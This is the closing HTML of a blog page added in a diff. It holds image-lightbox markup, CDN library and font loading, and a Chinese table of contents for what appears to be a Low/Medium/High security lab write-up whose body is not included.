+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
+</main>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+</div>
+<h2 class="widget-title section-title">目录</h2>
+<div class=widget--toc>
+<nav id=TableOfContents>
+<ol>
+<li><a href=#前言>前言</a></li>
+<li><a href=#原理>原理</a></li>
+<li><a href=#解题>解题</a>
+<ol>
+<li><a href=#low收集信息>Low：收集信息</a></li>
+<li><a href=#low解题>Low：解题</a></li>
+<li><a href=#medium收集信息>Medium：收集信息</a></li>
+<li><a href=#medium解题>Medium：解题</a></li>
+<li><a href=#high收集信息>High：收集信息</a></li>
+</ol>
+</li>
+<li><a href=#总结>总结</a></li>
+</ol>
+</nav>
+</div>
+</section>
+</aside>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+</body>
+</html>
